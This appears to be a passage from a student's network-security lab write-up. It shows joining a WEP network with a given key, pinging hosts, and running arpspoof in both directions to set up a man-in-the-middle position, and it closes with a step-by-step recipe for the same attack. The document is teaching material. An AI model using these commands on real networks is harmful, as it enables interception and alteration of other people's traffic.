After entering the WEP key for "netsec-wep" which is "C0FFEE4221611E4A1A446E2F20" we see that we successfully connected to the network and can continue with the arp spoofing part.

		
			cs@cs-VirtualBox:~$ iwconfig
				lo        no wireless extensions.

				enp0s3    no wireless extensions.

				wlx00c0ca5a50a5  IEEE 802.11  ESSID:"netsec-wep"  
				          Mode:Managed  Frequency:2.412 GHz  Access Point: C4:E9:84:D7:70:67   
				          Bit Rate=6 Mb/s   Tx-Power=20 dBm   
				          Retry short limit:7   RTS thr:off   Fragment thr:off
				          Power Management:on
				          Link Quality=70/70  Signal level=-31 dBm  
				          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
				          Tx excessive retries:11  Invalid misc:61   Missed beacon:0

			cs@cs-VirtualBox:~$ ifconfig
				enp0s3    Link encap:Ethernet  HWaddr 08:00:27:59:8a:48  
				          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
				          inet6 addr: fe80::f230:387:60ab:e8e8/64 Scope:Link
				          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
				          RX packets:135 errors:0 dropped:0 overruns:0 frame:0
				          TX packets:330 errors:0 dropped:0 overruns:0 carrier:0
				          collisions:0 txqueuelen:1000 
				          RX bytes:18947 (18.9 KB)  TX bytes:35204 (35.2 KB)

				lo        Link encap:Local Loopback  
				          inet addr:127.0.0.1  Mask:255.0.0.0
				          inet6 addr: ::1/128 Scope:Host
				          UP LOOPBACK RUNNING  MTU:65536  Metric:1
				          RX packets:472 errors:0 dropped:0 overruns:0 frame:0
				          TX packets:472 errors:0 dropped:0 overruns:0 carrier:0
				          collisions:0 txqueuelen:1 
				          RX bytes:32988 (32.9 KB)  TX bytes:32988 (32.9 KB)

				wlx00c0ca5a50a5 Link encap:Ethernet  HWaddr 00:c0:ca:5a:50:a5  
				          inet addr:192.168.84.158  Bcast:192.168.84.255  Mask:255.255.255.0
				          inet6 addr: fe80::e33e:ccf3:7963:6ec8/64 Scope:Link
				          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
				          RX packets:545 errors:0 dropped:0 overruns:0 frame:0
				          TX packets:175 errors:0 dropped:0 overruns:0 carrier:0
				          collisions:0 txqueuelen:1000 
				          RX bytes:52639 (52.6 KB)  TX bytes:28154 (28.1 KB)

			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.10
				PING 192.168.84.10 (192.168.84.10) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
				64 bytes from 192.168.84.10: icmp_seq=1 ttl=64 time=109 ms
				64 bytes from 192.168.84.10: icmp_seq=2 ttl=64 time=126 ms
				64 bytes from 192.168.84.10: icmp_seq=3 ttl=64 time=98.8 ms
				64 bytes from 192.168.84.10: icmp_seq=4 ttl=64 time=97.8 ms
				64 bytes from 192.168.84.10: icmp_seq=6 ttl=64 time=108 ms
				64 bytes from 192.168.84.10: icmp_seq=7 ttl=64 time=143 ms

			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.20
				PING 192.168.84.20 (192.168.84.20) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
				64 bytes from 192.168.84.20: icmp_seq=1 ttl=64 time=321 ms
				64 bytes from 192.168.84.20: icmp_seq=2 ttl=64 time=115 ms
				64 bytes from 192.168.84.20: icmp_seq=3 ttl=64 time=136 ms
				64 bytes from 192.168.84.20: icmp_seq=4 ttl=64 time=118 ms
				64 bytes from 192.168.84.20: icmp_seq=5 ttl=64 time=108 ms
				64 bytes from 192.168.84.20: icmp_seq=6 ttl=64 time=104 ms

			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.60
				PING 192.168.84.60 (192.168.84.60) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
				64 bytes from 192.168.84.60: icmp_seq=1 ttl=64 time=1163 ms
				64 bytes from 192.168.84.60: icmp_seq=2 ttl=64 time=144 ms
				64 bytes from 192.168.84.60: icmp_seq=3 ttl=64 time=121 ms
				64 bytes from 192.168.84.60: icmp_seq=4 ttl=64 time=111 ms
				64 bytes from 192.168.84.60: icmp_seq=5 ttl=64 time=475 ms
				64 bytes from 192.168.84.60: icmp_seq=6 ttl=64 time=118 ms

			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.43
				PING 192.168.84.43 (192.168.84.43) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
				64 bytes from 192.168.84.43: icmp_seq=1 ttl=64 time=1299 ms
				64 bytes from 192.168.84.43: icmp_seq=2 ttl=64 time=272 ms
				64 bytes from 192.168.84.43: icmp_seq=3 ttl=64 time=839 ms
				64 bytes from 192.168.84.43: icmp_seq=4 ttl=64 time=21.2 ms
				64 bytes from 192.168.84.43: icmp_seq=5 ttl=64 time=371 ms
				64 bytes from 192.168.84.43: icmp_seq=6 ttl=64 time=952 ms	
		
			cs@cs-VirtualBox:~$ sudo arpspoof -i wlx00c0ca5a50a5 -t 192.168.84.43 192.168.84.83
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5

			cs@cs-VirtualBox:~$ sudo arpspoof -i wlx00c0ca5a50a5 -t 192.168.84.83 192.168.84.43
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5


https://github.com/ChristophSchmidl/network-security/raw/master/assignment-2/img/4a_ping.PNG
https://github.com/ChristophSchmidl/network-security/raw/master/assignment-2/img/4a_udp_1.PNG
https://github.com/ChristophSchmidl/network-security/raw/master/assignment-2/img/4a_udp_2.PNG

As we take a look at the screenshots above we see that pinging the hosts is actually working (ICMP). Portforwarding and arp spoofing is also working by inspecting the two UDP packets. The first one is sent from host A to our machine and then from our machine to host B. To get some more insights on how the arpspoof command actually works, I looked into the man pages and also took two additional websites into account because they had some more sophisticated examples, namely:
	* https://security.stackexchange.com/questions/113524/a-question-about-arpspoof-command
	* http://linux-hacking-guide.blogspot.nl/2015/05/man-in-middle-attack-using-arpspoof-in.html

Arp spoofing works like this:
	1. Tell the 'victim' that we are 'gateway'. Open a terminal window and type the below command: ``` arpspoof -i <interface_name> -t victimIP gatewayIP ```
	2. Tell the 'gateway' that we are 'victim'. Open a terminal window and type the below command: ``` arpspoof -i <interface_name> -t gatewayIP victimIP ```				
	3. Enable ip forwarding and start capturing packets or alter package content and forward it.